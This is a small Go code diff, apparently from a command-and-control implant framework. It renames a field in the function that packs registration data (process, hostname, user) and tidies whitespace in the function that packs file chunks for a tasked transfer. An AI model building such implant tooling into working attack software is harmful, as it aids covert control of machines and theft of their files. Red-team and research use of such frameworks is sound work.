@@ -30,7 +30,7 @@ func PackRegistration(i *implant.ImplantMetadata, key, iv [16]byte) []byte {
 		[]byte(i.Proc),
 		[]byte(i.Hostname),
 		[]byte(i.User),
-		[]byte(i.Impl),
+		[]byte(i.Type),
 	}, internal.SEP)
 
 	binary.Write(buff, binary.BigEndian, uint16(len(dataSection)))
@@ -67,7 +67,7 @@ func PackChunk(i *implant.ImplantMetadata, f string, c []byte, TaskID [8]byte) [
 	binary.Write(buff, binary.BigEndian, internal.CHU)
 	PackMetadata(buff, i)
 	binary.Write(buff, binary.BigEndian, TaskID)
-	
+
 	// Prepare fileName
 	fileNameLen := uint32(len([]byte(f)))
 	binary.Write(buff, binary.BigEndian, fileNameLen)
